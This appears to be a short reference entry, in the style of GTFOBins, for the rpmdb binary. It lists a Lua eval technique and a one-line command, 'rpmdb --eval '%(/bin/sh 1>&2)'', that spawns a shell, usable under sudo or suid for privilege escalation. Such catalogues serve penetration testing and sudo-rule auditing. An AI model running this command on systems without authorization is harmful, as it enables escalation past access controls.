title: rpmdb
html:
rpmdb

Inherit

Context: sudo, suid, unprivileged

rpmdb --eval '%{lua:...}'

Shell

Context: sudo, suid, unprivileged

rpmdb --eval '%(/bin/sh 1>&2)'
